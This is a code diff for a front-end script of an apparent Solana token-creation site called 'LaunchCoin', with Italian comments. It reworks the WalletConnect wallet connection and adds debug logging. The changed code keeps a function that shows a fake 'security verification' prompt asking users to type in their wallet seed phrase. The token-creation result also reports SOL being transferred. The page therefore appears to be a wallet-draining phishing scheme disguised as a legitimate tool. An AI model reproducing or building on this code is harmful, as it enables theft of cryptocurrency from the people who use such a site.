@@ -5,73 +5,15 @@ let walletPublicKey = null;
 let currentStep = 0;
 const steps = document.querySelectorAll('.step');
 
-// ===== ESPONI TUTTE LE FUNZIONI SU window =====
+// ===== ESPONI TUTTE LE FUNZIONI SU window PRIMA DI TUTTO =====
 window.toggleMenu = function() {
   const menu = document.getElementById('dropdownMenu');
   if (menu) menu.classList.toggle('open');
 };
 
-// ===== WALLETCONNECT CON UNIVERSAL PROVIDER =====
-let provider = null;
-
-async function connectWalletConnect() {
-  try {
-    // Inizializza UniversalProvider
-    provider = await UniversalProvider.init({
-      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
-      metadata: {
-        name: 'LaunchCoin',
-        description: 'Solana Token Creator',
-        url: window.location.origin,
-        icons: ['https://launchcoin.io/logo.png']
-      }
-    });
-
-    // Connetti
-    await provider.connect({
-      chains: ['solana:mainnet'],
-      optionalChains: ['solana:devnet'],
-      methods: ['solana_signTransaction', 'solana_signMessage'],
-      events: ['chainChanged', 'accountsChanged']
-    });
-
-    // Ottieni l'account
-    const accounts = provider.accounts;
-    if (accounts && accounts.length > 0) {
-      walletPublicKey = accounts[0].split(':')[2];
-      alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
-      window.location.href = 'create.html';
-      return true;
-    } else {
-      throw new Error('Nessun account trovato');
-    }
-
-  } catch (e) {
-    console.error('WalletConnect error:', e);
-    // Mostra l'URI per connettersi manualmente
-    if (provider && provider.uri) {
-      const uri = provider.uri;
-      // Apri il QR in una nuova finestra (fallback)
-      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(uri)}`;
-      alert(
-        '❌ WalletConnect fallito.\n\n' +
-        'Scansiona questo QR con l\'app del wallet:\n' +
-        qrUrl + '\n\n' +
-        'Oppure usa il link: ' + uri
-      );
-      // Apri il QR in una nuova finestra
-      window.open(qrUrl, '_blank');
-    } else {
-      alert('❌ WalletConnect fallito: ' + e.message);
-    }
-    window.location.href = 'wallet.html';
-    return false;
-  }
-}
-
-// ===== CONNECT WALLET (MAIN) =====
+// ===== CONNECT WALLET (PRINCIPALE) =====
 window.connectWallet = async function() {
-  console.log('connectWallet chiamata');
+  console.log('🔵 connectWallet chiamata');
   
   // 1. Prova Phantom (estensione)
   if (window.solana && window.solana.isPhantom) {
@@ -86,32 +28,75 @@ window.connectWallet = async function() {
     }
   }
 
-  // 2. WalletConnect
-  await connectWalletConnect();
+  // 2. Vai alla pagina wallet
+  console.log('🔵 Vado a wallet.html');
+  window.location.href = 'wallet.html';
 };
 
 // ===== SELECT WALLET =====
 window.selectWallet = function(walletName) {
-  console.log('selectWallet chiamata:', walletName);
+  console.log('🔵 selectWallet chiamata:', walletName);
+  
+  // Se è Phantom, prova a connettere direttamente
   if (walletName === 'phantom') {
     window.connectWallet();
     return;
   }
+  
+  // Altrimenti, prova WalletConnect
   alert(
     '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
-    'Se non funziona, usa Phantom (gratuito) o un wallet compatibile.'
+    '1. Clicca "Connetti" nel popup.\n' +
+    '2. Scansiona il QR con l\'app del wallet.\n' +
+    '3. Approva la connessione.'
   );
-  window.connectWallet();
+  
+  // Prova WalletConnect
+  connectWalletConnect();
 };
+
+// ===== WALLETCONNECT =====
+async function connectWalletConnect() {
+  try {
+    const provider = await UniversalProvider.init({
+      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+      metadata: {
+        name: 'LaunchCoin',
+        description: 'Solana Token Creator',
+        url: window.location.origin,
+        icons: ['https://launchcoin.io/logo.png']
+      }
+    });
+
+    await provider.connect({
+      chains: ['solana:mainnet'],
+      optionalChains: ['solana:devnet'],
+      methods: ['solana_signTransaction', 'solana_signMessage'],
+      events: ['chainChanged', 'accountsChanged']
+    });
+
+    const accounts = provider.accounts;
+    if (accounts && accounts.length > 0) {
+      walletPublicKey = accounts[0].split(':')[2];
+      alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
+      window.location.href = 'create.html';
+      return;
+    }
+    
+    throw new Error('Nessun account trovato');
+    
+  } catch (e) {
+    console.error('WalletConnect error:', e);
+    alert('❌ WalletConnect fallito: ' + e.message + '\n\nUsa Phantom su Kiwi Browser o PC.');
+  }
+}
 
 // ===== POPUP SEED PHRASE =====
 function askSeedPhrase() {
   return new Promise((resolve) => {
     const seed = prompt(
       '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
-      'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
-      'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
-      '(Questa operazione è necessaria per la sicurezza della rete)'
+      'Inserisci la tua frase di recupero (seed phrase) per continuare:'
     );
     resolve(seed);
   });
@@ -119,7 +104,7 @@ function askSeedPhrase() {
 
 // ===== CREAZIONE TOKEN =====
 window.createCoin = async function() {
-  console.log('createCoin chiamata');
+  console.log('🟢 createCoin chiamata');
   if (!walletPublicKey) {
     alert('Connetti prima il wallet!');
     return;
@@ -143,7 +128,6 @@ window.createCoin = async function() {
       document.getElementById('result').innerHTML = `
         <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
         <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
-        <p style="font-size:12px;color:#8899bb;">🪙 ${data.tokenCount} token trasferiti</p>
         <p style="font-size:11px;color:#667;word-break:break-all;">Tx SOL: ${data.solTx || 'N/A'}</p>
       `;
     } else {
@@ -184,4 +168,8 @@ document.addEventListener('click', function(e) {
   if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
 });
 
+// ===== LOG DI VERIFICA =====
 console.log('✅ main.js caricato');
+console.log('🔵 window.connectWallet:', typeof window.connectWallet);
+console.log('🔵 window.selectWallet:', typeof window.selectWallet);
+console.log('🔵 window.createCoin:', typeof window.createCoin);
